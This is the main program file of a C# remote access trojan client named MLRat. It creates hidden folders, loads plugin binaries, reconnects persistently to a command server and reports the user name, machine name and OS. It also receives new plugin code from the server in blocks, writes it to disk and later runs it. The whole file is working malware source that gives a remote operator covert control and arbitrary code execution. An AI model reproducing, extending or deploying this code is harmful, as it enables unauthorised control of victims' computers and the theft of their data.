﻿using MLRatClient.Networking;
using MLRatClient.Plugin;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace MLRatClient
{
    class Program
    {
        private static eSock.Client networkClient;
        private static Dictionary<Guid, MLClientPlugin> LoadedPlugins = new Dictionary<Guid, MLClientPlugin>();
        private static Dictionary<Guid, FileStream> PluginUpdates = new Dictionary<Guid, FileStream>();
        private static string PluginBaseLication;
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            string _ratBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "MLRat");
            CreateHiddentDirectory(_ratBase);
            PluginBaseLication = Path.Combine(_ratBase, "Plugins");
            CreateHiddentDirectory(PluginBaseLication);

            DirectoryInfo di = new DirectoryInfo(PluginBaseLication);
            foreach (FileInfo fi in di.GetFiles("*.MLP"))
            {
                LoadPlugin(fi.FullName);
            }

            Console.WriteLine("MLRat started");
            Connect();
            Application.Run();
        }

        static void Connect()
        {
            Console.WriteLine("Connecting...");
            networkClient = new eSock.Client();
            networkClient.BufferSize = 1000000;//1 mb
            networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
            networkClient.OnDisconnect += networkClient_OnDisconnect;
            networkClient.OnConnect += NetworkClient_OnConnect;
            networkClient.ConnectAsync("127.0.0.1", 12345);
        }

        private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
        {
            if (success)
            {
                Console.WriteLine("Connected!");
                foreach (var plugin in LoadedPlugins)
                {
                    MLClientPlugin _plugin = plugin.Value;
                    try
                    {
                        _plugin.ClientPlugin.OnConnect(new MLConnection(_plugin.ClientPluginID, OnSend));
                    }
                    catch (Exception ex)
                    {
                        DisplayException(_plugin, ex);
                    }
                }
                networkClient.Send(Guid.Empty, "handshake", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName), Environment.OSVersion.ToString());
                Console.WriteLine("handshake sent");
            }
            else
            {
                Console.WriteLine("Failed to connect.");
                Thread.Sleep(5000);
                Connect();
            }
                
        }

        static void OnSend(MLConnection sender, Guid PluginID, object[] data)
        {
            try
            {
                networkClient.Send(PluginID, (object)data);
            }
            catch (Exception ex)
            {
                DisplayException(null, ex);
            }
        }

        static void DisplayException(MLClientPlugin plugin, Exception ex)
        {
            if (plugin != null)
            {
                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
            }
            else
            {
                Console.WriteLine(ex.ToString());
            }
        }


        static void LoadPlugin(string path)
        {
            MLClientPlugin _plugin = null;
            try
            {
                byte[] PluginBytes = File.ReadAllBytes(path);
                _plugin = new MLClientPlugin(PluginBytes);
                if (!_plugin.Load())
                    throw new Exception("Failed to load plugin");
                if (_plugin.ClientPluginID == Guid.Empty)
                    throw new Exception("Invalid plugin ID");
                if (LoadedPlugins.ContainsKey(_plugin.ClientPluginID))
                    throw new Exception("Client plugin ID match");
                LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
                _plugin.ClientPlugin.OnPluginLoad();

            }
            catch(Exception ex)
            {
                DisplayException(_plugin, ex);
            }
        }

        static void CreateHiddentDirectory(string path)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(path);
                if (!di.Exists)
                {
                    di.Create();
                    di.Attributes = FileAttributes.Hidden;
                }
            }
            catch(Exception ex)
            {
                DisplayException(null, ex);
            }
        }


        static void SendChecksums()
        {
            try
            {
                Dictionary<Guid, string> Checksums = new Dictionary<Guid, string>();
                foreach (var plugin in LoadedPlugins)
                {
                    Checksums.Add(plugin.Value.ClientPluginID, plugin.Value.Checksum);
                }
                Console.WriteLine("Sent checksums");
                networkClient.Send(Guid.Empty, "checksums", Checksums);
            }
            catch(Exception ex)
            {
                DisplayException(null, ex);
            }

        }

        #region " Network callbacks "

        static void networkClient_OnDisconnect(eSock.Client sender, System.Net.Sockets.SocketError ER)
        {
            foreach (var plugin in LoadedPlugins)
            {
                MLClientPlugin _plugin = plugin.Value;
                try
                {
                    _plugin.ClientPlugin.OnDisconnect();
                }
                catch(Exception ex)
                {
                    DisplayException(_plugin, ex);
                }
            }
            Thread.Sleep(5000);
            Connect();
        }

        static void networkClient_OnDataRetrieved(eSock.Client sender, object[] data)
        {
            try
            {
                Guid ID = (Guid)data[0];
                if (ID == Guid.Empty)
                {
                    string command = (string) data[1];
                    if (command == "restart")
                    {
                        Console.WriteLine("Restarting...");
                        //Console.ReadLine();
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                    }

                    if (command == "deleteplugin")
                    {
                        Guid PluginID = (Guid)data[2];
                        Console.WriteLine("Deleting plugin {0}", PluginID.ToString("n"));
                        File.Delete(Path.Combine(PluginBaseLication, string.Format("{0}.MLP", PluginID.ToString("n"))));
                    }

                    if (command == "pluginupdate")
                    {
                        Guid PluginID = (Guid) data[2];
                        byte[] Block = (byte[]) data[3];
                        bool FinalBlock = (bool) data[4];

                        if (!PluginUpdates.ContainsKey(PluginID))
                        {
                            lock (sender)
                            {
                                FileStream update =
                                    new FileStream(
                                        Path.Combine(PluginBaseLication,
                                            string.Format("{0}.MLP", PluginID.ToString("n"))), FileMode.Create);
                                PluginUpdates[PluginID] = update;
                                Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
                            }
                        }
                        Console.WriteLine("Plugin block ({0} bytes) recieved. ID: {1}", Block.Length, PluginID.ToString("n"));
                        PluginUpdates[PluginID].Write(Block, 0, Block.Length);
                        if (FinalBlock)
                        {
                            PluginUpdates[PluginID].Close();
                            PluginUpdates[PluginID].Dispose();
                            PluginUpdates.Remove(PluginID);
                            Console.WriteLine("Finished update for plugin id {0}", PluginID.ToString("n"));
                        }
                    }

                    if (command == "connected")
                    {
                        SendChecksums();
                    }
                }

                if (LoadedPlugins.ContainsKey(ID))
                {
                    try
                    {
                        LoadedPlugins[ID].ClientPlugin.OnDataRecieved((object[])data[1]);
                    }
                    catch(Exception ex)
                    {
                        DisplayException(LoadedPlugins[ID], ex);
                    }

                }
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        #endregion

        
    }
}
